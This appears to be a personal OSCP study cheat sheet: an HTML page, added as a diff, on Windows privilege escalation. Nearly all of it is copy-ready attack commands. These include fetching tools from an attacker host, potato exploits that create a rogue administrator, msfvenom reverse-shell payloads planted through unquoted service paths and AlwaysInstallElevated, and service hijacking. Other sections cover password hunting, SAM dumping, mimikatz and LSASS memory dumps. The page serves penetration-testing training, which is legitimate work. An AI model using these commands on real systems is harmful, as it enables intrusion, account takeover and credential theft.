@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Windows Privilege Escalation | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head><body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#auto">Automated Tools</a></li>
+      <li><a href="#baseline">Manual Baseline</a></li>
+      <li><a href="#potato">Token Impersonation</a></li>
+      <li><a href="#unquoted">Unquoted Service Paths</a></li>
+      <li><a href="#weaksvcs">Weak Service Permissions</a></li>
+      <li><a href="#aie">AlwaysInstallElevated</a></li>
+      <li><a href="#creds">Saved Credentials</a></li>
+      <li><a href="#hunt">Password Hunting</a></li>
+      <li><a href="#sam">SAM / LSASS Dump</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">🪟 Windows Privilege Escalation</h1>
+    <p class="page-sub">Run winpeas first. Check whoami /priv immediately — SeImpersonatePrivilege enabled = potato time.</p>
+
+    <section class="sec" id="auto">
+      <div class="sec-head"><h2>Automated Tools</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">transfer + run winpeas</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/winPEASx64.exe','C:\Windows\Temp\wp.exe')
+C:\Windows\Temp\wp.exe
+<span class="c"># If AV kills it:</span>
+C:\Windows\Temp\wp.exe log   <span class="c"># saves to winPEAS.log in cwd</span>
+<span class="c"># Read output: RED = check immediately, YELLOW = investigate</span></pre></div>
+    </section>
+
+    <section class="sec" id="baseline">
+      <div class="sec-head"><h2>Manual Baseline Enum</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">run all immediately after shell</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>whoami /all                      <span class="c"># CRITICAL: check ALL privileges</span>
+whoami /priv                     <span class="c"># SeImpersonatePrivilege? → potato</span>
+net user
+net localgroup administrators
+systeminfo                       <span class="c"># OS version, hotfixes installed</span>
+hostname
+ipconfig /all
+netstat -ano                     <span class="c"># listening ports, internal services</span>
+tasklist /svc
+schtasks /query /fo LIST /v      <span class="c"># scheduled tasks</span>
+wmic service get name,pathname,startmode | findstr /i "auto"
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2&gt;nul
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2&gt;nul</pre></div>
+    </section>
+
+    <section class="sec" id="potato">
+      <div class="sec-head"><h2>Token Impersonation — SeImpersonatePrivilege</h2></div>
+      <div class="note n-good">If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is Enabled → you almost certainly have a path to SYSTEM.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">identify correct potato by OS version</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>whoami /priv
+<span class="c"># Look for: SeImpersonatePrivilege (Enabled)</span>
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+<span class="c"># Windows 10/11, Server 2019/2022 → GodPotato (most universal)</span>
+<span class="c"># Windows Server 2016/2019 → PrintSpoofer (if spooler running)</span>
+<span class="c"># Windows Server 2008/2012/2016 → JuicyPotato (need CLSID)</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GodPotato (Server 2019+, Win10/11)</span><div class="cb-tags"><span class="tag t-crit">most common</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123! /add &amp;&amp; net localgroup administrators hacker /add"
+.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">PrintSpoofer (Server 2016/2019)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>sc query spooler   <span class="c"># verify spooler is running</span>
+.\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -i -c "powershell -ep bypass"
+.\PrintSpoofer64.exe -c "C:\Windows\Temp\shell.exe"</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">JuicyPotato (older systems)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Get CLSID from: https://github.com/ohpe/juicy-potato/tree/master/CLSID</span>
+.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker P@ss123! /add" -t * -c {CLSID}
+.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\shell.exe -t * -c {CLSID}</pre></div>
+    </section>
+
+    <section class="sec" id="unquoted">
+      <div class="sec-head"><h2>Unquoted Service Paths</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find + exploit</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Find services with unquoted paths containing spaces:</span>
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
+<span class="c"># Vulnerable: C:\Program Files\Some App\service.exe (no quotes)</span>
+<span class="c"># Windows tries: C:\Program.exe → C:\Program Files\Some.exe → ...</span>
+
+<span class="c"># Check write permissions on each candidate path:</span>
+icacls "C:\Program Files\Some App"
+<span class="c"># (W) or (F) for BUILTIN\Users = writable</span>
+
+<span class="c"># Generate payload + place it:</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o "Some.exe"
+<span class="c"># Copy to: C:\Program Files\Some.exe</span>
+sc stop &lt;servicename&gt;
+sc start &lt;servicename&gt;</pre></div>
+    </section>
+
+    <section class="sec" id="weaksvcs">
+      <div class="sec-head"><h2>Weak Service Permissions</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">accesschk + exploit</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Everyone" *
+accesschk.exe /accepteula -ucqv &lt;servicename&gt;
+<span class="c"># Look for: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS</span>
+
+<span class="c"># If you can change config:</span>
+sc config &lt;servicename&gt; binPath= "cmd /c net user hacker P@ss123! /add"
+sc stop &lt;servicename&gt;; sc start &lt;servicename&gt;
+sc config &lt;servicename&gt; binPath= "cmd /c net localgroup administrators hacker /add"
+sc stop &lt;servicename&gt;; sc start &lt;servicename&gt;
+<span class="c"># Now: evil-winrm or RDP as hacker:P@ss123!</span></pre></div>
+    </section>
+
+    <section class="sec" id="aie">
+      <div class="sec-head"><h2>AlwaysInstallElevated</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">check both registry keys + exploit</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="c"># BOTH must show: AlwaysInstallElevated    REG_DWORD    0x1</span>
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f msi -o evil.msi
+<span class="c"># Transfer to victim, then:</span>
+msiexec /quiet /qn /i C:\Windows\Temp\evil.msi</pre></div>
+    </section>
+
+    <section class="sec" id="creds">
+      <div class="sec-head"><h2>Saved Credentials</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">cmdkey + runas</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>cmdkey /list
+<span class="c"># If output shows: Target: Domain:interactive=WORKGROUP\Administrator</span>
+<span class="c"># → run as that user:</span>
+runas /savecred /user:WORKGROUP\Administrator "cmd /c whoami &gt; C:\Windows\Temp\out.txt"
+type C:\Windows\Temp\out.txt
+<span class="c"># If Administrator → run reverse shell:</span>
+runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Temp\shell.exe"</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">autologon creds in registry</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+<span class="c"># Look for: DefaultPassword, DefaultUsername, AutoAdminLogon=1</span></pre></div>
+    </section>
+
+    <section class="sec" id="hunt">
+      <div class="sec-head"><h2>Password Hunting</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">filesystem + registry search</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Filesystem:</span>
+findstr /si "password" *.xml *.ini *.txt *.config *.bak 2&gt;nul
+type C:\Windows\System32\sysprep\unattend.xml 2&gt;nul
+type C:\inetpub\wwwroot\web.config 2&gt;nul
+type "%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml" 2&gt;nul
+
+<span class="c"># Registry:</span>
+reg query HKLM /f password /t REG_SZ /s 2&gt;nul | findstr /i "password"
+reg query HKCU /f password /t REG_SZ /s 2&gt;nul | findstr /i "password"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s 2&gt;nul</pre></div>
+    </section>
+
+    <section class="sec" id="sam">
+      <div class="sec-head"><h2>SAM / LSASS Dump</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">dump SAM with reg (admin required)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>reg save HKLM\SAM C:\Windows\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
+reg save HKLM\SECURITY C:\Windows\Temp\security.bak
+<span class="c"># Download to kali, then parse:</span>
+impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">mimikatz</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>.\mimikatz.exe
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords    <span class="c"># cleartext creds + hashes from LSASS</span>
+lsadump::sam                <span class="c"># local SAM hashes</span>
+lsadump::lsa /patch         <span class="c"># domain hashes if DC</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">dump LSASS memory (AV evasion)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/procdump.exe','C:\Windows\Temp\pd.exe')
+C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+<span class="c"># Download lsass.dmp to kali, then:</span>
+pypykatz lsa minidump lsass.dmp</pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
